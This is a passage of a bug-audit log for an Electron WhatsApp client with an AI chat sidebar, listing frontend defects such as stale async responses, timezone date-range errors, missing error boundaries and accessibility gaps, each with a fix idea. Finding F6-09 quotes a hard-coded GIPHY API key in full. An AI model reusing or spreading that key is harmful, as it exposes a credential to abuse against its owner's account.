**Fix idea:** normalize both sides with the shared `isSameJid` / strip `:device`
before comparing (same helper F3-07 recommends).
**Status:** open

### [F5-06] med — src/renderer/src/components/chat/MessageView.tsx:209-229
**What:** `messages.map` renders `<MessageItem>` directly with no error boundary
anywhere in the subtree (`MessageItem` catches only `JSON.parse` of
`msg.content`).
**Why it's a bug:** any throw inside a message renderer — a media component, a
KaTeX/markdown edge case in `TextMessage`, `getThumbnailData`'s `btoa`, a
malformed `templateMessage` shape — unmounts the whole `MessageView` and leaves
the conversation pane blank with no recovery but an app reload. One bad message
takes out the entire chat.
**Fix idea:** wrap each row (or the list) in an error boundary that renders a
"couldn't display this message" placeholder and keeps the rest of the list.
**Status:** open

### [F5-07] low — src/renderer/src/components/chat/MessageView.tsx:253-255
**What:** `ReactionDetailsModal` does
`(message.reactions || []).sort((a, b) => parseInt(b.timestamp) - parseInt(a.timestamp))`
inside a `useMemo` — `Array.prototype.sort` mutates `message.reactions` in place.
**Why it's a bug:** the modal reorders the reaction array that lives on the
shared message object. `ReactionsDisplay` (and the `has-reactions` / emoji-slice
rendering in the bubble) then sees a different order, and any memo/identity
check that assumed a stable array is affected. Also `parseInt` on an undefined/
non-numeric `timestamp` yields `NaN` and an unstable sort.
**Fix idea:** copy first (`[...(message.reactions ?? [])].sort(…)`); guard the
timestamp parse.
**Status:** open

### [F5-08] low — src/renderer/src/components/common/WaveformPlayer.tsx:27,77-131 & src/renderer/src/components/chat/messages/SystemMessage.tsx:48-60
**What:** both components hardcode light-theme colors inline — WaveformPlayer:
`waveColor: 'rgba(0,0,0,0.2)'`, `progressColor: '#333'` (non-ptt), time text
`#888`, speed pill `background:'#f0f2f5'` / `color:'#54656f'`; SystemMessage
bubble: `background:'rgba(0,0,0,0.05)'`, `color:'#666'`, dark borders.
**Why it's a bug:** in dark theme the system-message text (`#666` on a dark
surface) and the waveform/speed-pill are very low contrast / near-invisible.
**Fix idea:** move these to CSS classes driven by the theme tokens the rest of
the app uses (`--wa-*`), or `currentColor`.
**Status:** open

### [F5-09] low — src/renderer/src/components/common/WaveformPlayer.tsx:22-68
**What:** (a) no coordination between players — starting one voice note doesn't
pause any other that is playing (WhatsApp does; `onPlay`/`onPause` props exist
but `AudioMessage` never passes them). (b) `playbackSpeed` is component state;
when the `useEffect` recreates the `WaveSurfer` instance (url change) the new
instance defaults to 1× while the pill still shows the old "1.5×"/"2×".
(c) effect deps are `[url, isPtt]` — `peaks` / `preDuration` changes are ignored.
**Fix idea:** lift a "currently playing player" ref/context; re-apply
`setPlaybackRate(playbackSpeed)` on `ready`; include the render inputs in deps.
**Status:** open

### [F5-10] low — src/renderer/src/components/chat/MessageView.tsx:95-111
**What:** the target-highlight effect returns a cleanup for the outer 120ms
`setTimeout` only; the inner `setTimeout(() => setHighlightedId(null), 2500)` is
never tracked or cleared.
**Why it's a bug:** if `MessageView` unmounts (chat switch / close) within 2.5s
of a jump, `setHighlightedId` fires after unmount (React warning). If a second
jump happens within 2.5s, the first run's timer clears the *new* highlight
early.
**Fix idea:** store both timer ids and clear them in the cleanup.
**Status:** open

### [F5-11] low — src/renderer/src/components/chat/messages/MediaMessages.tsx:204-208 (with MessageItem.tsx:303)
**What:** `StickerMessage`'s auto-download `useEffect` has
`[localURI, isDownloading, onDownload, downloadFailed]` deps; `onDownload` is
`handleDownload` from `MessageItem`, which is a plain function re-created on
every render (not `useCallback`).
**Why it's a bug:** the effect re-runs on every `MessageItem` render. It's
currently saved by the `!localURI && !isDownloading && !downloadFailed` guard,
but it's a fragile pattern — any change that makes the guard momentarily true
during a render storm re-triggers a download.
**Fix idea:** `useCallback` the media handlers in `MessageItem`; gate the
auto-download with a `useRef` "already tried" flag.
**Status:** open

### [F5-12] low — src/renderer/src/components/chat/messages/TemplateMessage.tsx:160
**What:** the quick-reply handler sends `button.text` (the display label) as the
outgoing message; the parsed `button.payload` (the `id` / quick-reply payload)
is discarded.
**Why it's a bug:** interactive/business flows key their next step on the reply
*id*, not the visible label (which can be localized or duplicated across
buttons). The bot may not recognize the response.
**Fix idea:** send the payload/id when present (API permitting), or send text
plus the id.
**Status:** open

### [F5-13] low — src/renderer/src/components/chat/MessageItem.tsx:232-234, 257-266
**What:** `useEffect(() => { api.getMyJid().then(setMyJid)… }, [])` and
`handleShowInfo` (`await api.getMessageReceipts` → `setReceipts`/`setShowInfo`)
have no is-mounted guard.
**Why it's a bug:** fast chat switching unmounts rows with these IPC calls in
flight → setState-after-unmount warnings (same class as F2-03). `myJid` also
refetched per message row instead of shared.
**Fix idea:** mounted flag / AbortController; lift `myJid` to a context.
**Status:** open

### [F5-14] low — src/renderer/src/components/chat/MessageInfoModal.tsx:11 & MessageView.tsx:257 (ReactionDetailsModal)
**What:** both modals close on backdrop click only — no `Escape` handler, no
focus trap, no focus restore to the opener, no `role="dialog"`/`aria-modal`.
**Why it's a bug:** keyboard-only users can open the message-info / reactions
modal from the dropdown but cannot dismiss it with `Escape`, and focus is left
behind the overlay. (F10 owns overlay policy; noted here as these live in F5.)
**Fix idea:** shared modal primitive with focus-trap + `Escape`, as F10 will
define.
**Status:** open

## Slice F6 — Message input & composition

Files audited: `components/chat/{MessageInput,MentionMenu,MultiFilePreview,DragDropOverlay}.tsx`,
`hooks/{useMentions,useMentionSession,useMultiFileQueue,useDragAndDrop,useAudioRecorder,useGiphy}.ts`,
`components/picker/EmojiStickerGifPicker.tsx`, `utils/{editorUtils,mentionUtils}.ts`.
Consumer `ChatLayout.tsx` cross-checked for the real send / staging / drag paths.
(`useMentionSession` + `mentionUtils` are only used by the AI input `AISmartInput.tsx`,
not the WhatsApp composer — the WA composer uses `useMentions`.)

### [F6-01] high — src/renderer/src/components/chat/MessageInput.tsx:85-91 + hooks/useAudioRecorder.ts (whole hook)
**What:** `useAudioRecorder()` holds recording state with no knowledge of
`activeJid`. `MessageInput`'s `activeJid` effect (:85-91) clears the text editor
but never calls `cancelRecording()`. `handleSendVoice` sends via
`onSendMedia(filePath, '', [])` which `ChatLayout` routes to
`sendMediaMessage(..., replyingTo?.id)` against **the currently active chat**.
**Why it's a bug:** start a voice recording in chat A, switch to chat B while it
records (or while the recorded blob is staged waiting for the send/trash choice),
press send → the voice note is delivered to chat B. Same class as the F3
out-of-order bugs but here it's a straight mis-delivery of user content to the
wrong conversation, with no way to undo. The stale recorder UI also overlays B's
composer (B can't type until the recording is trashed).
**Fix idea:** in the `activeJid` effect call `cancelRecording()` (and close any
staged blob); or key `useAudioRecorder` state by jid; snapshot the jid at
record-start and pass it explicitly to the send.
**Status:** open

### [F6-02] med — src/renderer/src/components/chat/MentionMenu.tsx:57-62 + MessageInput.tsx:181-205
**What:** mention rows are `<div … onClick={() => onSelect(p)}>` with no
`onMouseDown` / `preventDefault`. `handleSelectParticipant` then reads the caret
with `getCaretCharacterOffsetWithin(editor)` and bails unless
`textBeforeCursor.lastIndexOf('@') !== -1`.
**Why it's a bug:** clicking a mention with the mouse first blurs the
`contenteditable` (mousedown moves focus to the menu div), so by the time
`onClick` runs the selection is no longer inside the editor →
`getCaretCharacterOffsetWithin` returns 0 → `lastAtPos === -1` → the branch is
skipped and **nothing is inserted and no mention is registered**. Mouse users
cannot pick a mention at all; only the keyboard (ArrowUp/Down + Enter, which
keeps focus in the editor) works.
**Fix idea:** add `onMouseDown={e => e.preventDefault()}` to the mention rows so
the editor keeps focus/selection; or capture the caret offset on editor
`blur`/`input` and use `lastCaretOffsetRef` as the fallback.
**Status:** open

### [F6-03] med — src/renderer/src/hooks/useMentions.ts:20,42-67
**What:** `mentionedJids` is a `Set` that only ever grows (via `addMention`); it
is cleared only by `clearMentions()` (on successful send) or the `activeJid`
effect. `handleInputChange` recomputes the menu but never reconciles the set
against the text that is actually present.
**Why it's a bug:** type `@alice`, pick her, then backspace the whole `@alice`
token out (or edit it away) and send — `alice`'s JID is still in `mentionedJids`
and is passed to `onSend`, so the backend sends her a mention notification for a
message that doesn't mention her. Mention A, delete it, mention B → both A and B
are notified. `useMentionSession` (the AI input) does proper backspace/removeChip
reconciliation; `useMentions` has none.
**Fix idea:** on every `handleInputChange`, rebuild the mention set from the
`@<number>` tokens still present in the text (intersect with known participants),
or drop a JID when its token is no longer found.
**Status:** open

### [F6-04] med — src/renderer/src/hooks/useAudioRecorder.ts:94-102
**What:** `updateVisualizer` calls `setVisualizerData(<32-element array>)` on every
`requestAnimationFrame` (~60 Hz) for the entire duration of the recording, with a
fresh array each time.
**Why it's a bug:** the whole `MessageInput` subtree (and anything else consuming
the hook) re-renders ~60 times per second while recording — a sustained
re-render storm for what is a small 20-bar visualizer that could tolerate ~15
fps. On lower-end machines the composer visibly janks during recording.
**Fix idea:** throttle the state push (e.g. update every 3rd–4th frame or on a
~66 ms timer), and/or write the data into a ref that the visualizer reads via its
own rAF, keeping React out of the loop.
**Status:** open

### [F6-05] med — src/renderer/src/components/chat/MessageInput.tsx:483
**What:** the send/mic button does `onClick={text.trim() ? handleSend : startRecording}`.
`startRecording` (from `useAudioRecorder`) `await navigator.mediaDevices.getUserMedia`
and **re-throws** on failure; the onClick handler does not `.catch`.
**Why it's a bug:** if the user has denied microphone permission (or no input
device), clicking the mic button produces an unhandled promise rejection and
**zero UI feedback** — the button just appears dead. The user has no way to learn
that permission is the problem.
**Fix idea:** wrap the call, and on `NotAllowedError` / `NotFoundError` show a
toast / inline hint ("Microphone access is blocked — enable it in settings").
**Status:** open

### [F6-06] med — src/renderer/src/hooks/useDragAndDrop.ts:36-47
**What:** `dragCounter` is incremented on `dragenter` and decremented on
`dragleave`; `isDraggingOver` only clears when the counter returns to 0.
**Why it's a bug:** if a drag ends without a balancing `dragleave` on the tracked
element — drag leaves the window, drag cancelled with `Esc`, or a `dragend`
without `dragleave` — the counter stays > 0 and the full-screen `DragDropOverlay`
("Drop files here") stays stuck over the chat, blocking clicks on the composer
and message list until the user does another full enter→leave cycle.
**Fix idea:** also reset `dragCounter.current = 0` / `setIsDraggingOver(false)` on
a `window` `dragend`/`drop` and on `mouseleave` of the document, or use a short
"no dragover seen recently" timeout to auto-clear.
**Status:** open

### [F6-07] med — src/renderer/src/components/picker/EmojiStickerGifPicker.tsx:136-140,262-263
**What:** `api.getFavoriteStickers().then(setFavoriteStickers)` runs in an effect
keyed on `[activeTab]` and again in the favorites pack-button `onClick`, neither
with a mounted guard.
**Why it's a bug:** (a) switching to the sticker tab and closing the picker
before `getFavoriteStickers` resolves → `setFavoriteStickers` on an unmounted
component (React warning, wasted work) — the picker is unmounted on click-outside
and on `activeJid` change. (b) The line-70 effect (`[selectedPackIndex, activeTab]`)
also calls `fetchGiphy(searchQuery, 'stickers')` with a lying dep array (missing
`searchQuery`, `fetchGiphy`), so it fetches with a stale query and double-fetches
alongside the line-53 debounce effect.
**Fix idea:** add an `alive` flag to the favorites fetch; consolidate the two
GIPHY-sticker trigger effects into one with honest deps.
**Status:** open

### [F6-08] low — src/renderer/src/components/picker/EmojiStickerGifPicker.tsx:104
**What:** `handleStickerClick` does `stickerUrl.replace('.gif', '.webp')` to force
a WhatsApp-native sticker.
**Why it's a bug:** `String.replace` with a string arg replaces only the first
occurrence and does nothing if `.gif` isn't literally present (URL already
`.webp`, `.gif` only in a query param, extension in different case, or a
CDN path without an extension). A non-matching URL is then downloaded as-is and
`downloadUrlToTemp`'d into a `*.webp` filename — a mislabelled file that WhatsApp
may reject or send as a document.
**Fix idea:** replace only a trailing `/\.gif(\?|$)/i`, or derive the webp URL
from the sticker object's typed fields like `handleGiphyStickerClick` does.
**Status:** open

### [F6-09] low — src/renderer/src/hooks/useGiphy.ts:3
**What:** a GIPHY API key is hard-coded as the fallback when
`VITE_GIPHY_API_KEY` is unset (`'5Gf9Jd9uS7N9xI5U8H7vFjXy4H9mN8Z1'`), committed
to the repo.
**Why it's a bug:** the key is shipped in the renderer bundle for every build
that doesn't set the env var; if it's a real key it's now public and rate-limits
/ can be abused against the owner's account, and if it's a throwaway the GIF/
sticker tabs silently 401 for every user who didn't configure `.env` (the error
UI blames the user's missing `.env`).
**Fix idea:** no fallback — when the env var is missing, render a clear
"GIF search not configured" state instead of calling GIPHY with a dead key.
**Status:** open

### [F6-10] low — src/renderer/src/hooks/useMultiFileQueue.ts:23 + components/chat/MultiFilePreview.tsx:113
**What:** the queue silently caps at `maxFiles` (default 30) inside the `setStagedFiles`
reducer (`break` out of the loop), and `MultiFilePreview` independently
hard-codes `files.length < 30` to show the "add more" button.
**Why it's a bug:** (a) dropping/selecting 40 files stages the first 30 with no
message telling the user 10 were dropped. (b) The `30` is duplicated — changing
`useMultiFileQueue(maxFiles)` at the call site would not update the preview's
gate, so the "+" button and the actual accept limit can disagree.
**Fix idea:** return a `maxFiles` / `droppedCount` from the hook; have
`MultiFilePreview` gate on `files.length < maxFiles`; surface a toast when files
are dropped over the limit.
**Status:** open

### [F6-11] low — src/renderer/src/components/chat/MentionMenu.tsx:31-51
**What:** the `keydown` effect depends on `[filtered, selectedIndex, onSelect, onClose]`.
`onSelect` (`handleSelectParticipant`) and `onClose` (`() => handleInputChange(text, 0)`)
are re-created on every `MessageInput` render, and `MessageInput` re-renders on
every keystroke.
**Why it's a bug:** while the mention menu is open, the `window` `keydown`
listener is removed and re-added on every keystroke / parent re-render — churn,
and a small window where a keypress can land between removal and re-add.
`filtered.length === 0` also still registers the listener (early `return null` is
after the hooks), and `(prev ± 1) % 0` → `NaN` selectedIndex.
**Fix idea:** wrap `handleSelectParticipant` / the close handler in `useCallback`;
guard the arrow-key math when `filtered.length === 0`.
**Status:** open

### [F6-12] low — src/renderer/src/components/chat/MessageInput.tsx:173-179,264-281
**What:** `handleSelectGif` / `handleSelectSticker` / `handleSendVoice` call
`onSendMedia(filePath, '', …)` with no reply id awareness at this layer, and none
of them clear `replyingTo`.
**Why it's a bug:** `ChatLayout.handleSendMediaMessage` does pass `replyingTo?.id`,
so a GIF/sticker/voice note sent while a reply is staged is correctly sent as a
reply — but the `replyingTo` banner is never cleared afterward (only the
text-send and multi-file paths call `setReplyingTo(null)`), so the next plain
message is unexpectedly also a reply to the same message.
**Fix idea:** clear the reply state in the media/voice/gif/sticker send paths too
(lift a single `onSent` callback that resets reply + input).
**Status:** open

### [F6-13] low — src/renderer/src/utils/editorUtils.ts:56-73,78-94 (via MessageInput.handleEditorInput)
**What:** `handleEditorInput` runs `hasRawEmojis(editor)` on every `input` event
and, when true, does a full `editor.innerHTML = convertTextToHtml(plainText)` +
`setCaretPosition`. `hasRawEmojis` / `getEditableText` / `getCaretCharacterOffsetWithin`
each walk the whole DOM subtree and `emojiRegex()` is re-compiled on every call.
**Why it's a bug:** for a long message with many emoji, every keystroke does
several full-subtree walks plus an `innerHTML` reparse and manual caret
restoration — perceptible input lag on large messages, and the caret-offset
restoration (plain-text offset counting an emoji `img` as `data-emoji.length`
chars) can drift, jumping the cursor mid-typing.
**Fix idea:** only re-render when a raw emoji was actually just inserted (diff the
last input), hoist the `emojiRegex()` instances to module scope, and debounce the
HTML re-sync.
**Status:** open

### [F6-14] low — src/renderer/src/components/chat/EmojiStickerGifPicker.tsx:53-67 & useGiphy.ts:11-44
**What:** GIPHY search has a 500 ms debounce but no request-sequencing; `fetchGiphy`
just `setGifs(json.data)` whenever a response lands.
**Why it's a bug:** two searches in flight (slow network, or the trending→search
transition) can resolve out of order, leaving the grid showing results for a
previous query. `loading` (`giphyLoading || localLoading`) is also a single flag
shared by search and by download, so clicking a GIF shows the full-panel spinner
over the whole grid.
**Fix idea:** capture a request id / `AbortController` per `fetchGiphy` call and
ignore stale resolutions.
**Status:** open

## Slice F7 — Search UI

Files audited: `components/chat/{ChatSearchSidebar,SearchFiltersPanel,SearchResultsPanel}.tsx`,
`utils/messagePreview.ts`, `components/chat/hooks/useSearch.ts` (+ tests), and the
consumer `ChatList.tsx` (search state wiring, lines 58-95, 306-380). Snippet /
name / query strings are all rendered as React text nodes (auto-escaped) — no XSS
in the search UI. `useSearch` itself correctly guards stale resolutions with an
`ignored` flag; its `filters`-by-reference dep is already logged as F3-09.

### [F7-01] high — src/renderer/src/components/chat/ChatSearchSidebar.tsx:40-63
**What:** the in-chat search-sidebar debounce effect fires
`const data = await api.searchAll(query, 'normal', filters)` then
`setResults(data.messages || [])` with **no stale-request guard**. The effect
cleanup only `clearTimeout(timer)` — it cannot cancel a `searchAll` call that has
already started. Unlike `useSearch.ts` (which has an `ignored` flag), this
component has none.
**Why it's a bug:** type `a` (debounce fires, request A in flight), then within
300 ms type `ab` (request B fires). If A resolves after B — common on a large
history or deep index — `setResults` overwrites B's results with A's, so the
panel shows matches for `a` while the input says `ab`. `highlightMatch` then
uses the *current* `query` (`ab`) and highlights nothing / the wrong span.
Same effect on rapid `fromDate`/`toDate`/`activeJid` changes. This is the
checklist's headline "search-as-you-type out-of-order responses" case.
**Fix idea:** add `let ignored = false` in the effect, set it in cleanup, and
gate `setResults`/`setIsSearching` on `!ignored` (mirror `useSearch.ts`), or
capture a request-seq ref.
**Status:** open

### [F7-02] med — src/renderer/src/components/chat/ChatSearchSidebar.tsx:46-49 & SearchFiltersPanel.tsx:149,156
**What:** date-input values (`YYYY-MM-DD`) are converted with
`new Date(fromDate).toISOString()` / `new Date(e.target.value).toISOString()`.
`new Date("2026-01-15")` is parsed as **UTC midnight**, and `toDate` is sent as
that same instant (start of the day), not end-of-day.
**Why it's a bug:** (a) the `toDate` bound is exclusive of almost the entire
selected end day — pick "15th to 15th" and you get zero results; pick a range
ending today and today's messages are all missed. (b) For users east of UTC
(e.g. IST) the `fromDate` UTC-midnight bound is the previous evening local, so
the range is off by up to a day at both ends.
**Fix idea:** build the bounds from local time — `fromDate` → local 00:00:00,
`toDate` → local 23:59:59.999 — before `toISOString()`.
**Status:** open

### [F7-03] med — src/renderer/src/components/chat/ChatSearchSidebar.tsx:65-81 & SearchFiltersPanel.tsx:50-63
**What:** `setQuickRange` computes `from`/`to` with local-time mutators
(`setHours(0,0,0,0)`, `setDate(-7)`, …) then `ChatSearchSidebar` does
`from.toISOString().split('T')[0]` to feed the `type=date` inputs.
**Why it's a bug:** for a positive UTC offset, local midnight today converts to
*yesterday's* date in UTC, so the "Today" chip populates `fromDate` with
yesterday and "Last 7d" with an 8-day span; combined with F7-02 the actual query
window is wrong by a day. `SearchFiltersPanel` passes the raw ISO through
without the `.split` but still anchors "today" at local-midnight→UTC.
**Fix idea:** format the date parts from local getters
(`` `${y}-${pad(m)}-${pad(d)}` ``) rather than round-tripping through
`toISOString()`.
**Status:** open

### [F7-04] med — src/renderer/src/components/chat/ChatList.tsx:319-320, 362 (+ SearchFiltersPanel clear paths)
**What:** every "clear" path in `SearchFiltersPanel` sets keys to `undefined`
rather than deleting them — `onFiltersChange({ ...filters, jids: undefined })`,
`{ ...filters, fromDate: undefined, toDate: undefined }`. `ChatList`'s
filter-toggle "active" state is `showFilters || Object.keys(filters).length > 0`.
**Why it's a bug:** after the user adds then clears all filters, `filters` is
`{ jids: undefined, fromDate: undefined, toDate: undefined }` — `Object.keys`
length 3 — so the filter button stays lit as if filters were active, with no way
to reset it short of never having touched filters. `useSearch`'s `filters` dep
also churns a new object on each of these no-op clears.
**Fix idea:** delete keys instead of assigning `undefined` (or compute "active"
from `filters.jids?.length || filters.fromDate || filters.toDate`).
**Status:** open

### [F7-05] low — src/renderer/src/components/chat/SearchFiltersPanel.tsx:131
**What:** `checked={filters.jids?.includes(chat.jid)}` evaluates to `undefined`
whenever `filters.jids` is unset (the default "All chats" state).
**Why it's a bug:** a React checkbox with `checked={undefined}` is treated as
uncontrolled → dev-console warning "changing an uncontrolled input to controlled"
the first time any chat is selected, and the box can briefly retain a
browser-set state out of sync with `filters`.
**Fix idea:** `checked={!!filters.jids?.includes(chat.jid)}`.
**Status:** open

### [F7-06] low — src/renderer/src/components/chat/SearchFiltersPanel.tsx:23-48, 87-140
**What:** the chat-select dropdown (`showChatDropdown`) has no outside-click /
`Escape` close handler and no cleanup; and `filteredDropdownChats` is
`.slice(0, 100)`, while `selectAllFiltered` maps over that same sliced array.
**Why it's a bug:** (a) the dropdown can only be dismissed by clicking its own
toggle again; clicking into the results or elsewhere leaves it open, overlaying
content. (b) With >100 matching chats, "Select All" silently selects only the
first 100 and the user gets no indication the rest were skipped.
**Fix idea:** add a `mousedown` outside-click listener (removed on unmount) +
`Escape`; either raise/remove the 100 cap for select-all or surface the count.
**Status:** open

### [F7-07] low — src/renderer/src/components/chat/SearchResultsPanel.tsx:133,135 & 105,107
**What:** message rows use `key={`msg-${item.messageId}`}` and call
`onSelectChat(item.jid, item.name, item.messageId)`; `SearchResultItem.messageId`
is optional. Deep/semantic results or chat-type rows without a `messageId`
produce `key="msg-undefined"` (collisions when >1) and a jump target of
`undefined`.
**Why it's a bug:** duplicate keys → React reuses the wrong row (wrong snippet /
score shown, lost highlight); clicking such a row opens the chat but
`jumpToMessage(undefined)` no-ops or throws downstream with no feedback.
**Fix idea:** filter out message results lacking `messageId`, or fall back to a
composite key (`msg-${item.jid}-${idx}`) and skip the jump when `messageId` is
absent.
**Status:** open

### [F7-08] low — src/renderer/src/components/chat/ChatSearchSidebar.tsx:29-63, 104
**What:** the debounce effect has no `mounted` guard and the component is
`if (!isOpen) return null` (kept mounted by the parent). On a real unmount (chat
close / layout swap) with a `searchAll` in flight, `setResults`/`setIsSearching`
fire after unmount. Also on `activeJid` change the previous chat's `results`
stay rendered (scoped to the old jid) until the new request resolves.
**Why it's a bug:** setState-after-unmount warning (same class as F2-03/F5-13);
and a brief window where the sidebar shows another chat's search hits with the
new chat's header.
**Fix idea:** reuse the F7-01 `ignored` flag for the unmount guard; clear
`results` synchronously when `activeJid` changes.
**Status:** open

## Slice F8 — AI chat UI

Files audited: `components/ai/{AIChatSidebar,AIMessageBubble,AISmartInput,AIToolCard,
CitationPill,CitationMarkdownRenderer,AIChatHistoryModal,AISettingsModal,
AIChatExportButton}.tsx`, `components/ai/hooks/{useAIStream,useAIChatSessions}.ts`,
`hooks/{useCitation,useCitationActions}.ts`, `types/ai/**`. Cross-checked
`hooks/useChatNavigation.ts`, preload `aiChatStream`/`abortAiChat` (F1-04/F1-05),
`src/main/services/ai/AIChatSessionService.ts` for the session/timestamp shapes.

**Markdown XSS check (clean):** all AI/thought text goes through `<ReactMarkdown>`
with no `rehype-raw` (raw HTML escaped) and a `urlTransform` that delegates to
react-markdown's `defaultUrlTransform` for every scheme except `cite:`; `cite:`
hrefs are intercepted by the `a` component and rendered as a `<CitationPill>`
`<button>`, never as an anchor. Non-citation links get `defaultUrlTransform`'s
`javascript:`/`data:` stripping. No injection vector found here (contrast F5-01,
where the WA `TextMessage` overrode `urlTransform` with identity).

### [F8-01] high — src/renderer/src/components/ai/hooks/useAIStream.ts:275-281 & AIChatSidebar.tsx:191-204,276-285
**What:** Switching AI sessions (History modal `onSelectSession`), starting a New
Chat, deleting the active session, and closing the sidebar (`isOpen` → `return
null`) all call `setMessages([])` / load another session's messages but **never
call `abort()`**. The in-flight stream's preload listeners stay registered and
its callbacks keep running against the now-replaced state.
**Why it's a bug:** start a long AI response, then click a different session in
History (or "New Chat"). The old stream keeps generating on the backend
(wasted tokens/compute, no way to stop it — the abort button is gone with the
old input). When it finally emits `-end`: the drip loop's `setMessages` maps
over the *new* conversation (no-op), the `-end` handler can't find `aiMsgId` so
`finalContent=''`, and the `100 ms` auto-save `setTimeout` then calls
`saveCurrentMessages(activeSessionIdRef.current, messagesRef.current)` — i.e. it
re-persists whatever session is now open. The actual streamed answer is silently
lost and never saved to the session that requested it.
**Fix idea:** call `abort()` at the top of `selectSession`/`startNewChat`/delete
and in a `useAIStream` unmount cleanup; have `-end`/auto-save bail if
`activeSessionIdRef.current` differs from the session captured at
`startStream` time (snapshot the sid per stream).
**Status:** open

### [F8-02] med — src/renderer/src/components/ai/hooks/useAIStream.ts:46-52,65-93,101-110
**What:** The unmount cleanup only `clearInterval(typingInterval.current)`. The
per-stream `-chunk`/`-end`/`-error` IPC listeners (registered inside
`api.aiChatStream`, F1-05) are not disposed on unmount, and the `-chunk`
callback calls `drip()`, which does `if (!typingInterval.current) typingInterval
.current = setInterval(...)` — **re-creating the interval after unmount**.
**Why it's a bug:** close the AI sidebar (or navigate) while a stream is active.
Chunks keep arriving, each one re-arms the 30 ms interval, and the interval's
`setMessages` runs on the unmounted hook → repeated setState-after-unmount
warnings and wasted renders until the backend stream ends. Over a long session
with many AI chats the undisposed listeners also accumulate (F1-05).
**Fix idea:** return a disposer from `aiChatStream` and call it (plus `abort()`)
in the hook's unmount cleanup; guard `drip()` with an `isMountedRef`.
**Status:** open

### [F8-03] med — src/renderer/src/components/ai/hooks/useAIStream.ts:275-281
**What:** `abort` does `await api.abortAiChat(activeChannelId)` with no
`try/catch`; `setActiveChannelId(null)` / `setLoading(false)` run only on the
resolve path.
**Why it's a bug:** if `abortAiChat` rejects (backend already tore the stream
down, IPC error), the click produces an unhandled promise rejection and
`activeChannelId` stays truthy, so `AISmartInput` stays `disabled` showing the
Stop button forever — the user can't type or send until they reload. The
`-end`/`-error` events that would normally clear it may never come if the stream
is already gone.
**Fix idea:** `try { await api.abortAiChat(id) } finally { setActiveChannelId(null);
setLoading(false) }`.
**Status:** open

### [F8-04] med — src/renderer/src/hooks/useCitation.ts:23-49
**What:** `resolve` caches an entity in `globalCitationCache` only `if (entity)`.
A citation index that the backend resolves to `null` (deleted message, bad
index, session not yet persisted) is never cached, so every subsequent call
re-hits `api.resolveCitation`.
**Why it's a bug:** `CitationPill`'s effect calls `resolve(index)` on every
mount, and during streaming the markdown subtree re-renders on every drip tick
(~33/s) — each re-render remounts/re-runs the pills. For any unresolvable
citation in the answer that's a sustained IPC storm (one `resolve-citation`
round-trip per pill per render) for the whole stream, plus `setLoadingIndices`
churn.
**Fix idea:** cache negative results too (store `null`, or a sentinel), and/or
dedupe in-flight requests per `(sessionId,index)` with a promise map.
**Status:** open

### [F8-05] med — src/renderer/src/components/ai/CitationPill.tsx:19-21
**What:** `useEffect(() => { resolve(index).then(setEntity) }, [index, resolve])`
— no mounted guard, and `resolve` identity changes whenever `sessionId` changes.
**Why it's a bug:** pills mount and unmount constantly while the answer streams
in (markdown re-parse each tick). A `resolve` that settles after the pill
unmounts calls `setEntity` on an unmounted component → React warning; same class
as F2-03 / F5-13, but here it fires many times per answer.
**Fix idea:** `let alive = true` flag with cleanup, or an `AbortController` /
ignore-stale pattern.
**Status:** open

### [F8-06] med — src/renderer/src/components/ai/AISettingsModal.tsx:124-134
**What:** the API-key `<input onChange>` does `await api.setProviderKey(provider,
val)` on **every keystroke**, with no debounce or blur/commit step.
**Why it's a bug:** typing/pasting a 40-char key fires ~40 IPC writes, each
persisting a partial/invalid key to the backend key store. If the backend
validates or probes the key on set (network call), that's 40 failing probes; and
if the user navigates away mid-type the last persisted value is a truncated key
that silently breaks the provider until they retype it fully.
**Fix idea:** keep the field local and persist on blur / debounced (500 ms) /
explicit Save.
**Status:** open

### [F8-07] med — src/renderer/src/components/ai/AIChatSidebar.tsx:301-323
**What:** `messages.filter(...).map(msg => <AIMessageBubble .../>)` with no error
boundary anywhere in the AI sidebar subtree. `AIMessageBubble` renders
`<ReactMarkdown>` + `remark-math` + `rehype-katex` over unvalidated model
output.
**Why it's a bug:** a KaTeX parse edge case, a malformed markdown table, or any
throw inside a bubble unmounts the entire `AIChatSidebar` — the whole assistant
panel goes blank with no recovery but toggling it closed/open (and if the throw
is in persisted history it recurs on reload). Same class as F5-06.
**Fix idea:** wrap each bubble (or the list) in an error boundary that renders a
"couldn't display this message" fallback.
**Status:** open

### [F8-08] low — src/renderer/src/components/ai/AIChatSidebar.tsx:88-90
**What:** the auto-scroll effect is keyed on `[messages.length, loading]`. During
streaming the message count is constant and `loading` flips to `false` on the
first chunk, so after the first token no further scroll happens.
**Why it's a bug:** for any answer taller than the viewport the view stops
following the streaming text — the user has to manually scroll to keep reading,
and jumping back to bottom only happens on the next message.
**Fix idea:** also depend on the active message's content length, or observe the
scroll container size, and only auto-scroll when already near the bottom.
**Status:** open

### [F8-09] low — src/renderer/src/components/ai/AISettingsModal.tsx:78-79 & AIChatHistoryModal.tsx:79-80 & AIChatExportButton.tsx:84
**What:** all three modals (and the export confirm-delete) close on
overlay-click only — no `Escape` handler, no focus trap, no focus restore to the
opener, no `role="dialog"`/`aria-modal`. `AISettingsModal` also has no close
button in its header (only the "Done" button at the bottom and the backdrop).
**Why it's a bug:** keyboard-only users can open AI settings / history but can't
dismiss with `Escape`, and focus is left behind the overlay. Consistent with
F5-14; F10 owns the shared fix.
**Fix idea:** shared modal primitive with focus-trap + `Escape`.
**Status:** open

### [F8-10] low — src/renderer/src/components/ai/CitationPill.tsx:32
**What:** `title={entity ? \`Go to ${entity.type}: ${JSON.stringify(entity)}\` : …}`
— the native tooltip dumps the raw entity object (`chatJid`, `messageId`,
`filePath`) as JSON.
**Why it's a bug:** hovering a citation shows an unreadable JSON blob including
absolute file paths / internal JIDs instead of a human label; minor info leak
and poor UX.
**Fix idea:** format a friendly title per type (e.g. "Go to file: report.pdf").
**Status:** open

### [F8-11] low — src/renderer/src/components/ai/hooks/useAIStream.ts:54-170 & AIChatSidebar.tsx:133-140
**What:** (a) `startStream` is `useCallback(..., [])` but closes over
`saveCurrentMessages` (not memoised in `useAIChatSessions` — new ref every
render) and reads options/tools/session via refs; the empty dep array is a
deliberate lie that only works because those refs are hand-synced. Fragile — any
new direct dependency added to `startStream` will silently use stale values.
(b) `handleSend`'s catch branch pushes an error message with
`id: (Date.now() + 1).toString()` — non-UUID, collides if two errors land in the
same ms, and inconsistent with `crypto.randomUUID()` everywhere else.
**Fix idea:** memoise `saveCurrentMessages` with `useCallback`; use
`crypto.randomUUID()` for the error message id.
**Status:** open

